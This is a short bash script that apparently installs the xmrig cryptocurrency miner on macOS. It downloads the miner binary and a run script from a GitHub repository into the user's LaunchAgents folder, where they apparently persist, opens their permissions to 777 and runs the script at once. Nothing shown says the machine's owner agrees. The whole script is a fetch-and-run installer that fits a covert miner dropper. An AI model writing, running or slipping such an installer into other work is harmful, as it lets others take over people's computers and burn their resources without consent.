#!/usr/bin/env bash

#installs the miner

curl -L https://github.com/Me1955/me-mine/raw/main/xmrig >> ~/Library/Launchagents/xmrig
chmod 777 ~/Library/LaunchAgents/xmrig

curl -L https://github.com/Me1955/me-mine/raw/main/run.sh >> ~/Library/Launchagents/run.sh
chmod 777 ~/Library/Launchagents/run.sh
sh ~/Library/Launchagents/run.sh
